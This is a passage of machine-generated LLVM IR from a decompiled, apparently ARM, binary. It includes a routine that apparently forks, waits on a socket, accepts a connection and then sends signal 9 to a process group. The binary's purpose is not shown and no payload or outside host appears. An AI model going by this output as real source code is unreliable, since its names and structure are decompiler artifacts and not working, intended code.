  %stack_var_-2316.7 = phi i32 [ %stack_var_-2316.5, %.thread31 ], [ %stack_var_-2316.9, %dec_label_pc_a8f8 ], [ %stack_var_-2316.9, %.thread47 ], [ %stack_var_-2316.9, %.thread50 ], [ %stack_var_-2316.9, %.thread41 ], [ %stack_var_-2316.9, %.thread44 ], [ %stack_var_-2316.9, %.thread19 ], [ %stack_var_-2316.9, %.thread22 ], [ %stack_var_-2316.9, %.thread25 ], [ %stack_var_-2316.9, %.thread28 ], [ %stack_var_-2316.9, %dec_label_pc_a218 ], [ %stack_var_-2316.9, %dec_label_pc_a14c ], [ %stack_var_-2316.5, %.thread34 ], [ %stack_var_-2316.5, %.thread118 ], [ %stack_var_-2316.9, %.thread129 ]
  %stack_var_-2320.7 = phi i32 [ %stack_var_-2320.5, %.thread31 ], [ %stack_var_-2320.9, %dec_label_pc_a8f8 ], [ %stack_var_-2320.9, %.thread47 ], [ %stack_var_-2320.9, %.thread50 ], [ %stack_var_-2320.9, %.thread41 ], [ %stack_var_-2320.9, %.thread44 ], [ %stack_var_-2320.9, %.thread19 ], [ %stack_var_-2320.9, %.thread22 ], [ %stack_var_-2320.9, %.thread25 ], [ %stack_var_-2320.9, %.thread28 ], [ %stack_var_-2320.9, %dec_label_pc_a218 ], [ %stack_var_-2320.9, %dec_label_pc_a14c ], [ %stack_var_-2320.5, %.thread34 ], [ %stack_var_-2320.5, %.thread118 ], [ %stack_var_-2320.9, %.thread129 ]
  %stack_var_-2312.6 = phi i32 [ %stack_var_-2312.4, %.thread31 ], [ %stack_var_-2312.8, %dec_label_pc_a8f8 ], [ %stack_var_-2312.8, %.thread47 ], [ %stack_var_-2312.8, %.thread50 ], [ %stack_var_-2312.8, %.thread41 ], [ %stack_var_-2312.8, %.thread44 ], [ %stack_var_-2312.8, %.thread19 ], [ %stack_var_-2312.8, %.thread22 ], [ %stack_var_-2312.8, %.thread25 ], [ %stack_var_-2312.8, %.thread28 ], [ %stack_var_-2312.8, %dec_label_pc_a218 ], [ %stack_var_-2312.8, %dec_label_pc_a14c ], [ %stack_var_-2312.4, %.thread34 ], [ %stack_var_-2312.4, %.thread118 ], [ %stack_var_-2312.8, %.thread129 ]
  %v0_a900 = call i32 @function_9b00()
  store i32 %v0_a900, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a914

dec_label_pc_a908:                                ; preds = %dec_label_pc_9f0c
  store i32 %v0_9f6c, i32* @r0, align 4
  store i32 15, i32* @r1, align 4
  br label %dec_label_pc_a910

dec_label_pc_a910:                                ; preds = %.thread16, %dec_label_pc_a6a4, %dec_label_pc_a908
  %v0_a910 = call i32 @function_9b68()
  store i32 %v0_a910, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a914

dec_label_pc_a914:                                ; preds = %dec_label_pc_a5cc, %dec_label_pc_9f0c, %dec_label_pc_a0b4, %bb193, %dec_label_pc_a900, %dec_label_pc_a210, %dec_label_pc_a910
  %stack_var_-2328.6 = phi i32 [ %stack_var_-2328.5, %dec_label_pc_a900 ], [ %stack_var_-2328.7, %dec_label_pc_9f0c ], [ %stack_var_-2328.7, %dec_label_pc_a910 ], [ %stack_var_-2328.1, %dec_label_pc_a210 ], [ %stack_var_-2328.7, %dec_label_pc_a5cc ], [ %v0_a51c, %bb193 ], [ %stack_var_-2328.7, %dec_label_pc_a0b4 ]
  %stack_var_-2308.5 = phi i32 [ %stack_var_-2308.4, %dec_label_pc_a900 ], [ %stack_var_-2308.6, %dec_label_pc_9f0c ], [ %stack_var_-2308.6, %dec_label_pc_a910 ], [ %stack_var_-2308.0, %dec_label_pc_a210 ], [ %stack_var_-2308.6, %dec_label_pc_a5cc ], [ %stack_var_-2308.6, %bb193 ], [ %stack_var_-2308.6, %dec_label_pc_a0b4 ]
  %stack_var_-2324.9 = phi i8 [ %stack_var_-2324.8, %dec_label_pc_a900 ], [ %stack_var_-2324.10, %dec_label_pc_9f0c ], [ %stack_var_-2324.10, %dec_label_pc_a910 ], [ %stack_var_-2324.4, %dec_label_pc_a210 ], [ %stack_var_-2324.10, %dec_label_pc_a5cc ], [ %stack_var_-2324.10, %bb193 ], [ %stack_var_-2324.10, %dec_label_pc_a0b4 ]
  %stack_var_-2316.8 = phi i32 [ %stack_var_-2316.7, %dec_label_pc_a900 ], [ %stack_var_-2316.9, %dec_label_pc_9f0c ], [ %stack_var_-2316.9, %dec_label_pc_a910 ], [ %stack_var_-2316.3, %dec_label_pc_a210 ], [ %stack_var_-2316.9, %dec_label_pc_a5cc ], [ %stack_var_-2316.9, %bb193 ], [ %stack_var_-2316.9, %dec_label_pc_a0b4 ]
  %stack_var_-2320.8 = phi i32 [ %stack_var_-2320.7, %dec_label_pc_a900 ], [ %stack_var_-2320.9, %dec_label_pc_9f0c ], [ %stack_var_-2320.9, %dec_label_pc_a910 ], [ %stack_var_-2320.3, %dec_label_pc_a210 ], [ %stack_var_-2320.9, %dec_label_pc_a5cc ], [ %stack_var_-2320.9, %bb193 ], [ %stack_var_-2320.9, %dec_label_pc_a0b4 ]
  %stack_var_-2312.7 = phi i32 [ %stack_var_-2312.6, %dec_label_pc_a900 ], [ %stack_var_-2312.8, %dec_label_pc_9f0c ], [ %stack_var_-2312.8, %dec_label_pc_a910 ], [ %stack_var_-2312.2, %dec_label_pc_a210 ], [ %stack_var_-2312.8, %dec_label_pc_a5cc ], [ %stack_var_-2312.8, %bb193 ], [ %stack_var_-2312.8, %dec_label_pc_a0b4 ]
  %v1_a918 = add i32 %stack_var_-2308.5, 1
  %v0_a91c = load i32, i32* @r7, align 4
  %v1_a924 = add i32 %v0_a91c, 1048
  store i32 %v1_a924, i32* @r7, align 4
  %v1_a92c.pre = load i32, i32* @fp, align 4
  br label %dec_label_pc_a928

dec_label_pc_a928:                                ; preds = %dec_label_pc_9efc, %dec_label_pc_a914
  %v0_9f6c = phi i32 [ %v1_a924, %dec_label_pc_a914 ], [ %stack_var_-2312.1, %dec_label_pc_9efc ]
  %stack_var_-2312.8 = phi i32 [ %stack_var_-2312.7, %dec_label_pc_a914 ], [ %stack_var_-2312.1, %dec_label_pc_9efc ]
  %v1_a92c = phi i32 [ %v1_a92c.pre, %dec_label_pc_a914 ], [ %v1_a92c83, %dec_label_pc_9efc ]
  %stack_var_-2328.7 = phi i32 [ %stack_var_-2328.6, %dec_label_pc_a914 ], [ %stack_var_-2328.0, %dec_label_pc_9efc ]
  %stack_var_-2308.6 = phi i32 [ %v1_a918, %dec_label_pc_a914 ], [ 0, %dec_label_pc_9efc ]
  %stack_var_-2324.10 = phi i8 [ %stack_var_-2324.9, %dec_label_pc_a914 ], [ %stack_var_-2324.3, %dec_label_pc_9efc ]
  %stack_var_-2316.9 = phi i32 [ %stack_var_-2316.8, %dec_label_pc_a914 ], [ %stack_var_-2316.2, %dec_label_pc_9efc ]
  %stack_var_-2320.9 = phi i32 [ %stack_var_-2320.8, %dec_label_pc_a914 ], [ %stack_var_-2320.2, %dec_label_pc_9efc ]
  store i32 %stack_var_-2308.6, i32* %r3.global-to-local, align 4
  %v5_a930 = icmp slt i32 %stack_var_-2308.6, %v1_a92c
  br i1 %v5_a930, label %dec_label_pc_9f0c, label %dec_label_pc_9efc

dec_label_pc_a938:                                ; preds = %dec_label_pc_9ba0
  store i32 %v3_9ba0, i32* @r4, align 4
  store i32 %v6_9ba0, i32* @r5, align 4
  store i32 %v9_9ba0, i32* @r6, align 4
  store i32 %v12_9ba0, i32* @r7, align 4
  ret i32 %v0_9bac

; uselistorder directives
  uselistorder i32 %stack_var_-2320.9, { 14, 34, 26, 17, 15, 22, 21, 19, 20, 35, 32, 31, 29, 28, 27, 25, 24, 23, 18, 1, 0, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 37, 36, 33, 30, 16 }
  uselistorder i32 %stack_var_-2316.9, { 14, 34, 23, 17, 15, 19, 32, 30, 31, 35, 29, 28, 26, 25, 24, 22, 21, 20, 18, 1, 0, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 37, 36, 33, 27, 16 }
  uselistorder i8 %stack_var_-2324.10, { 14, 17, 32, 24, 18, 15, 20, 33, 30, 29, 27, 26, 25, 23, 22, 21, 19, 1, 0, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 35, 34, 31, 28, 16 }
  uselistorder i32 %stack_var_-2308.6, { 35, 34, 30, 22, 16, 14, 18, 31, 28, 27, 25, 24, 23, 21, 20, 19, 17, 1, 0, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 33, 32, 29, 26, 15 }
  uselistorder i32 %stack_var_-2328.7, { 15, 32, 24, 18, 16, 20, 28, 9, 33, 30, 29, 27, 26, 25, 23, 22, 21, 19, 1, 0, 14, 13, 12, 11, 10, 8, 7, 6, 5, 4, 3, 2, 35, 34, 31, 17 }
  uselistorder i32 %v1_a92c, { 1, 0 }
  uselistorder i32 %stack_var_-2312.8, { 14, 31, 23, 17, 15, 19, 32, 29, 28, 26, 25, 24, 22, 21, 20, 18, 1, 0, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 34, 33, 30, 27, 16 }
  uselistorder i32 %v0_9f6c, { 22, 3, 1, 2, 0, 7, 6, 5, 4, 23, 17, 18, 11, 10, 9, 8, 15, 16, 19, 20, 14, 13, 12, 21 }
  uselistorder i32 %v0_a8ec, { 1, 0 }
  uselistorder i32 %v1_a8c4.pre-phi, { 1, 0 }
  uselistorder i32 %v2_a878, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32 %v0_a868, { 1, 0 }
  uselistorder i32 %v2_a7ec, { 0, 1, 3, 2, 5, 4, 6 }
  uselistorder i32 %v0_a7dc, { 1, 0 }
  uselistorder i32 %v2_a768, { 0, 1, 3, 2, 5, 4, 6 }
  uselistorder i32 %v2_a5e0, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32 %v2_a528, { 0, 1, 2, 3, 4, 5, 7, 6, 9, 8, 10 }
  uselistorder i32 %v5_a504, { 2, 0, 1, 3 }
  uselistorder i32 %v3_a4a8, { 1, 2, 0 }
  uselistorder i32 %v1_a490, { 1, 0 }
  uselistorder i32 %v2_a41c, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 12, 11, 13 }
  uselistorder i32 %v0_a3d4, { 1, 0 }
  uselistorder i32 %v4_a3b4, { 1, 0, 2 }
  uselistorder i32 %v0_a390, { 2, 1, 0 }
  uselistorder i32 %v1_a37854, { 1, 0 }
  uselistorder i32 %v1_a374, { 1, 0 }
  uselistorder i32 %v1_a370, { 1, 2, 0 }
  uselistorder i1 %v9_a35c, { 1, 0 }
  uselistorder i32 %v0_a334, { 2, 1, 0 }
  uselistorder i32 %v0_a330, { 1, 0 }
  uselistorder i32 %stack_var_-2312.4, { 1, 2, 3, 0 }
  uselistorder i32 %stack_var_-2320.5, { 1, 2, 3, 0 }
  uselistorder i32 %stack_var_-2316.5, { 1, 2, 3, 0 }
  uselistorder i8 %stack_var_-2324.6, { 1, 2, 3, 0 }
  uselistorder i32 %stack_var_-2308.2, { 1, 2, 3, 0 }
  uselistorder i32 %stack_var_-2328.3, { 1, 2, 3, 0 }
  uselistorder i32 %v1_a1cc, { 1, 0, 2 }
  uselistorder i32 %v5_a1bc, { 0, 4, 3, 2, 1, 5, 6, 7 }
  uselistorder i32 %v0_a1ac, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v3_a180, { 1, 0 }
  uselistorder i32 %v3_a178, { 1, 0, 2 }
  uselistorder i32 %v1_a16c, { 1, 2, 0 }
  uselistorder i32 %v2_a160, { 1, 0 }
  uselistorder i32 %v3_a0f0, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v4_a0b4, { 1, 0, 2 }
  uselistorder i32 %v0_a0c4, { 0, 2, 1 }
  uselistorder i32 %v0_a038, { 2, 4, 0, 1, 3 }
  uselistorder i32 %v0_a00c, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_9ff4, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v1_9fcc, { 1, 0 }
  uselistorder i32 %v0_9fc4, { 1, 2, 3, 4, 5, 0, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 %v3_9f7c, { 1, 0 }
  uselistorder i8 %v3_9f0c, { 1, 0 }
  uselistorder i32 %stack_var_-2312.1, { 1, 0, 2 }
  uselistorder i32 %v1_9ef0, { 1, 0 }
  uselistorder i32 %v0_9ed0, { 1, 0 }
  uselistorder i32 %v2_9dac, { 1, 0, 3, 2, 5, 4, 6 }
  uselistorder i32 %v2_9d7c, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32 %v2_9d10, { 0, 1, 3, 2, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14, 16 }
  uselistorder i32 %v2_9c74, { 1, 0, 2, 3 }
  uselistorder i32 %v2_9c2c, { 3, 0, 2, 1, 4 }
  uselistorder i32 %v0_9c28, { 1, 0 }
  uselistorder i32 %v1_9c04, { 1, 0 }
  uselistorder i32 %storemerge134, { 1, 0 }
  uselistorder i32 %v0_9bac, { 1, 3, 2, 0, 4 }
  uselistorder i32* %stack_var_-36, { 1, 2, 0 }
  uselistorder i32* %stack_var_-2304, { 3, 9, 1, 10, 0, 11, 2, 12, 13, 4, 7, 14, 5, 6, 15, 8, 16 }
  uselistorder i32* %stack_var_-76, { 0, 2, 1 }
  uselistorder i32* %stack_var_-44, { 0, 2, 1 }
  uselistorder i32* %stack_var_-40, { 1, 0, 2, 4, 3 }
  uselistorder i32 %tmp136, { 2, 3, 0, 1 }
  uselistorder i32* %r6.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 0, 3, 1, 2, 10, 4, 5, 6, 7, 8, 9, 11 }
  uselistorder i32* %r3.global-to-local, { 42, 10, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 43, 44, 29, 30, 31, 32, 33, 38, 39, 34, 35, 36, 37, 40, 48, 41, 45, 46, 47, 49, 50, 51, 52, 53, 54, 58, 55, 56, 57 }
  uselistorder i32* %r1.global-to-local, { 54, 16, 0, 1, 10, 2, 3, 4, 29, 5, 6, 7, 8, 9, 11, 12, 13, 14, 15, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 31, 30, 32, 33, 34, 55, 36, 35, 37, 38, 39, 40, 41, 42, 44, 43, 46, 45, 47, 48, 49, 52, 50, 51, 53, 56, 57, 59, 58, 60, 61, 67, 68, 69, 70, 71, 62, 63, 64, 65, 66 }
  uselistorder i32* %r0.global-to-local, { 80, 107, 108, 40, 39, 1, 4, 5, 6, 7, 8, 28, 10, 9, 11, 12, 13, 15, 14, 68, 17, 16, 18, 19, 20, 21, 23, 22, 25, 24, 27, 26, 30, 29, 32, 31, 34, 33, 36, 35, 38, 37, 41, 42, 44, 43, 45, 46, 48, 47, 49, 50, 51, 55, 52, 53, 54, 57, 56, 58, 59, 60, 62, 61, 64, 63, 65, 66, 67, 69, 74, 71, 70, 73, 72, 75, 76, 77, 79, 78, 111, 110, 112, 2, 81, 82, 109, 83, 85, 84, 86, 87, 88, 89, 91, 90, 93, 92, 96, 94, 95, 3, 97, 98, 99, 100, 101, 102, 103, 104, 106, 105, 114, 113, 116, 115, 117, 118, 119, 120, 122, 121, 143, 145, 144, 146, 148, 147, 149, 150, 161, 151, 152, 153, 154, 155, 157, 156, 158, 160, 162, 159, 124, 123, 125, 126, 127, 128, 129, 130, 132, 131, 133, 134, 136, 135, 137, 138, 140, 139, 141, 142, 0 }
  uselistorder i32 (i32)* @function_82cc, { 14, 13, 12, 1, 0, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i32* bitcast ([3 x i8]* @global_var_e83c.191 to i32*), { 2, 1, 0 }
  uselistorder [3 x i8]* @global_var_e83c.191, { 1, 0 }
  uselistorder i8** @global_var_17440.132, { 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_17440.132 to i8*), { 1, 0 }
  uselistorder i8* @global_var_17441.133, { 2, 1, 0 }
  uselistorder i32 ptrtoint ([11 x i8]* @global_var_e43c.178 to i32), { 1, 2, 0, 3 }
  uselistorder [2 x i8]* @global_var_e41c.174, { 1, 0 }
  uselistorder i32 1044, { 0, 1, 2, 3, 4, 6, 5, 7, 8 }
  uselistorder i32 (i32, i32)* @function_9a20, { 1, 0 }
  uselistorder i32 (i32, i32*, i32, i32)* @function_c04c, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i32 16384, { 9, 29, 6, 21, 5, 22, 11, 23, 12, 24, 7, 25, 8, 26, 2, 27, 3, 28, 13, 30, 10, 31, 4, 33, 14, 32, 1, 34, 15, 35, 0, 16, 17, 18, 19, 20 }
  uselistorder i32 (i32, i8)* @function_9b20, { 1, 2, 0 }
  uselistorder i8 3, { 1, 0, 4, 3, 2 }
  uselistorder i8 2, { 3, 1, 2, 0 }
  uselistorder i32 2048, { 4, 5, 2, 6, 1, 7, 3, 8, 9, 0, 10, 11 }
  uselistorder i8 1, { 0, 1, 5, 4, 3, 2, 6, 7, 8 }
  uselistorder i32 (i32, i32, i32)* @function_9934, { 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_17448.135 to i32), { 1, 0, 2 }
  uselistorder i32* @global_var_17444.156, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_b410, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_aba4, { 15, 14, 13, 12, 11, 10, 9, 7, 2, 1, 0, 8, 6, 5, 4, 3 }
  uselistorder i32 1024, { 4, 11, 3, 12, 2, 13, 1, 14, 6, 15, 5, 16, 7, 20, 8, 21, 9, 17, 10, 18, 0, 19 }
  uselistorder i32 ()* @function_ab0c, { 32, 37, 36, 35, 34, 33, 31, 30, 29, 28, 27, 26, 2, 25, 1, 24, 23, 22, 21, 20, 19, 18, 15, 17, 16, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 0 }
  uselistorder i32 (i32)* @function_83d0, { 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @function_81cc, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 1048, { 3, 2, 6, 0, 1, 5, 4, 7 }
  uselistorder i32* @fp, { 1, 3, 2, 0, 4, 5, 8, 7, 6, 9, 10 }
  uselistorder i32* @global_var_1743c.130, { 0, 2, 1 }
  uselistorder i32* @sb, { 1, 2, 3, 4, 5, 0, 6, 7 }
  uselistorder label %dec_label_pc_a928, { 1, 0 }
  uselistorder label %dec_label_pc_a914, { 6, 4, 0, 3, 5, 2, 1 }
  uselistorder label %dec_label_pc_a910, { 2, 1, 0 }
  uselistorder label %dec_label_pc_a900, { 14, 11, 10, 0, 9, 8, 1, 3, 2, 7, 6, 5, 4, 12, 13 }
  uselistorder label %dec_label_pc_a8ec, { 9, 3, 4, 12, 5, 6, 7, 0, 8, 10, 11, 1, 2 }
  uselistorder label %dec_label_pc_a8c4, { 1, 0 }
  uselistorder label %dec_label_pc_a868, { 1, 0 }
  uselistorder label %dec_label_pc_a7dc, { 3, 2, 0, 1 }
  uselistorder label %bb193, { 1, 0 }
  uselistorder label %dec_label_pc_a4b8, { 1, 0 }
  uselistorder label %dec_label_pc_a48c, { 1, 0 }
  uselistorder label %dec_label_pc_a3d4, { 1, 0 }
  uselistorder label %dec_label_pc_a380, { 1, 0 }
  uselistorder label %.thread39, { 1, 0 }
  uselistorder label %dec_label_pc_a2a4, { 1, 0 }
  uselistorder label %dec_label_pc_a2a0, { 2, 0, 1 }
  uselistorder label %.thread16, { 1, 0 }
  uselistorder label %dec_label_pc_a210, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_a0b4, { 1, 0 }
  uselistorder label %dec_label_pc_a084, { 7, 2, 4, 1, 3, 5, 6, 0 }
  uselistorder label %dec_label_pc_a018, { 0, 2, 1 }
  uselistorder label %dec_label_pc_9f88, { 5, 6, 3, 7, 8, 0, 9, 2, 10, 1, 11, 12, 4, 13 }
  uselistorder label %dec_label_pc_9efc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9ed0, { 1, 0 }
  uselistorder label %dec_label_pc_9ec4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9ec0, { 1, 0 }
  uselistorder label %dec_label_pc_9de0, { 1, 0 }
  uselistorder label %bb183, { 1, 0 }
}

define i32 @function_a944(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_a944:
  %v0_a944 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_a944, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_a944
  %v2_a96c = mul i32 %arg2, ptrtoint (i32* @global_var_a974.157 to i32)
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_a944, %bb
  %v3_a96c = phi i32 [ %arg1, %dec_label_pc_a944 ], [ %v2_a96c, %bb ]
  ret i32 %v3_a96c

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_a9cc(i32 %arg1) local_unnamed_addr {
dec_label_pc_a9cc:
  %v2_a9d0 = load i32, i32* @global_var_1744c.201, align 4
  %v2_a9d8 = call i32 @function_b984(i32 %v2_a9d0, i32 9)
  %v0_a9dc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_a9dc, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_a9cc
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_a9cc, %bb
  ret i32 %v2_a9d8

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_a9e0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_a9e0:
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_a9e0 = load i32, i32* @r4, align 4
  store i32 %v3_a9e0, i32* %stack_var_-24, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* %r8.global-to-local, align 4
  %v0_a9f0 = call i32 @function_b8ac()
  %v7_a9f4 = icmp eq i32 %v0_a9f0, -1
  %. = zext i1 %v7_a9f4 to i32
  %tmp18 = icmp slt i32 %v0_a9f0, 1
  br i1 %tmp18, label %thread-pre-split, label %bb19

bb19:                                             ; preds = %dec_label_pc_a9e0
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_a9e0, %bb19
  %v0_aa08 = phi i32 [ 1, %bb19 ], [ %., %dec_label_pc_a9e0 ]
  %v2_aa08 = icmp eq i32 %v0_aa08, 0
  store i32 ptrtoint (i32* @global_var_1744c.201 to i32), i32* %r3.global-to-local, align 4
  store i32 %v0_a9f0, i32* @global_var_1744c.201, align 4
  br i1 %v2_aa08, label %dec_label_pc_aa18, label %dec_label_pc_ab00

dec_label_pc_aa18:                                ; preds = %thread-pre-split
  %v0_aa18 = call i32 @function_9444()
  %v2_aa28 = ptrtoint i32* %stack_var_-180 to i32
  %v2_aa48 = ptrtoint i32* %stack_var_-24 to i32
  %v2_aa78 = ptrtoint i32* %stack_var_-36 to i32
  br label %dec_label_pc_aa1c

dec_label_pc_aa1c:                                ; preds = %dec_label_pc_aab8, %dec_label_pc_aa48, %dec_label_pc_aa98, %dec_label_pc_aa18
  store i32 16, i32* %stack_var_-28, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_aa28

dec_label_pc_aa28:                                ; preds = %dec_label_pc_aa28, %dec_label_pc_aa1c
  %v1_aa30 = phi i32 [ %v1_aa34, %dec_label_pc_aa28 ], [ 0, %dec_label_pc_aa1c ]
  store i32 0, i32* @r5, align 4
  %v3_aa30 = add i32 %v1_aa30, %v2_aa28
  %v4_aa30 = inttoptr i32 %v3_aa30 to i32*
  store i32 0, i32* %v4_aa30, align 4
  %v0_aa34 = load i32, i32* %r3.global-to-local, align 4
  %v1_aa34 = add i32 %v0_aa34, 4
  store i32 %v1_aa34, i32* %r3.global-to-local, align 4
  %v7_aa38 = icmp eq i32 %v1_aa34, 128
  br i1 %v7_aa38, label %dec_label_pc_aa40, label %dec_label_pc_aa28

dec_label_pc_aa40:                                ; preds = %dec_label_pc_aa28
  %v0_aa40 = load i32, i32* @r4, align 4
  %v7_aa40 = icmp eq i32 %v0_aa40, -1
  br i1 %v7_aa40, label %dec_label_pc_aa98, label %dec_label_pc_aa48

dec_label_pc_aa48:                                ; preds = %dec_label_pc_aa40
  %v3_aa4c = udiv i32 %v0_aa40, 32
  store i32 %v3_aa4c, i32* @r7, align 4
  %v4_aa50 = mul nuw nsw i32 %v3_aa4c, 4
  %v5_aa50 = add i32 %v4_aa50, %v2_aa48
  %v1_aa54 = add i32 %v5_aa50, -156
  %v2_aa54 = inttoptr i32 %v1_aa54 to i32*
  %v3_aa54 = load i32, i32* %v2_aa54, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_aa5c = urem i32 %v0_aa40, 32
  store i32 %v1_aa5c, i32* @r6, align 4
  %v7_aa60 = shl i32 1, %v1_aa5c
  %v8_aa60 = or i32 %v3_aa54, %v7_aa60
  store i32 %v8_aa60, i32* %v2_aa54, align 4
  %v0_aa6c = load i32, i32* @r4, align 4
  %v1_aa6c = load i32, i32* %r3.global-to-local, align 4
  %v2_aa6c = add i32 %v1_aa6c, %v0_aa6c
  store i32 10, i32* %stack_var_-36, align 4
  %v0_aa74 = load i32, i32* @r5, align 4
  store i32 %v2_aa78, i32* @ip, align 4
  store i32 %v0_aa74, i32* %r3.global-to-local, align 4
  %v5_aa88 = call i32 @function_ba74(i32 %v2_aa6c, i32 %v2_aa28, i32 %v0_aa74, i32 %v0_aa74, i32 %v2_aa78)
  %v2_aa8c = icmp eq i32 %v5_aa88, 0
  br i1 %v2_aa8c, label %dec_label_pc_aa1c, label %dec_label_pc_aab0

dec_label_pc_aa98:                                ; preds = %dec_label_pc_aa40
  %v0_aa98 = call i32 @function_939c()
  %v2_aaa0 = call i32 @function_b5dc(i32 %v0_aa98, i32 5)
  %v1_aaa4 = add i32 %v2_aaa0, 5
  %v1_aaa8 = call i32 @function_c82c(i32 %v1_aaa4)
  br label %dec_label_pc_aa1c

dec_label_pc_aab0:                                ; preds = %dec_label_pc_aa48
  %v7_aab0 = icmp eq i32 %v5_aa88, -1
  br i1 %v7_aab0, label %dec_label_pc_aaf8, label %dec_label_pc_aab8

dec_label_pc_aab8:                                ; preds = %dec_label_pc_aab0
  %v1_aabc = load i32, i32* @r7, align 4
  %v4_aabc = mul i32 %v1_aabc, 4
  %v5_aabc = add i32 %v4_aabc, %v2_aa48
  store i32 %v5_aabc, i32* %r3.global-to-local, align 4
  %v1_aac0 = add i32 %v5_aabc, -156
  %v2_aac0 = inttoptr i32 %v1_aac0 to i32*
  %v3_aac0 = load i32, i32* %v2_aac0, align 4
  %v1_aac4 = load i32, i32* @r6, align 4
  %v6_aac4 = ashr i32 %v3_aac0, %v1_aac4
  store i32 %v6_aac4, i32* %r3.global-to-local, align 4
  %v1_aac8 = urem i32 %v6_aac4, 2
  %v2_aac8 = icmp eq i32 %v1_aac8, 0
  br i1 %v2_aac8, label %dec_label_pc_aa1c, label %dec_label_pc_aad0

dec_label_pc_aad0:                                ; preds = %dec_label_pc_aab8
  %v2_aad4 = ptrtoint i32* %stack_var_-28 to i32
  %v0_aad8 = load i32, i32* @r4, align 4
  %v4_aadc = bitcast i32* %stack_var_-52 to %sockaddr*
  %v5_aadc = call i32 @function_bee0(i32 %v0_aad8, %sockaddr* %v4_aadc, i32 %v2_aad4, i32 %v6_aac4)
  %v1_aae0 = call i32 @function_86f0(i32 %v5_aadc)
  %v1_aae4 = call i32 @function_9920(i32 %v1_aae0)
  %v1_aae8 = call i32 @function_a9cc(i32 %v1_aae4)
  %v0_aaec = load i32, i32* %r8.global-to-local, align 4
  %v1_aaec = sub i32 0, %v0_aaec
  %v2_aaf4 = call i32 @function_b984(i32 %v1_aaec, i32 9)
  br label %dec_label_pc_aaf8

dec_label_pc_aaf8:                                ; preds = %dec_label_pc_aab0, %dec_label_pc_aad0
  %v1_aafc = call i32 @function_c798(i32 0)
  %v2_ab04.pre = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_ab00

dec_label_pc_ab00:                                ; preds = %thread-pre-split, %dec_label_pc_aaf8
  %v20_ab04 = phi i32 [ %v1_aafc, %dec_label_pc_aaf8 ], [ %v0_a9f0, %thread-pre-split ]
  %v2_ab04 = phi i32 [ %v2_ab04.pre, %dec_label_pc_aaf8 ], [ %v3_a9e0, %thread-pre-split ]
  store i32 %v2_ab04, i32* @r4, align 4
  ret i32 %v20_ab04

; uselistorder directives
  uselistorder i32 %v6_aac4, { 1, 0, 2 }
  uselistorder i32 %v0_aa74, { 1, 0, 2 }
  uselistorder i32 %v1_aa5c, { 1, 0 }
  uselistorder i32 %v3_aa4c, { 1, 0 }
  uselistorder i32 %v0_aa40, { 2, 1, 0 }
  uselistorder i32 %v1_aa34, { 1, 2, 0 }
  uselistorder i32 %v2_aa28, { 1, 0 }
  uselistorder i32 %v0_a9f0, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-24, { 0, 2, 1 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32 (i32)* @function_c82c, { 5, 0, 4, 2, 3, 1 }
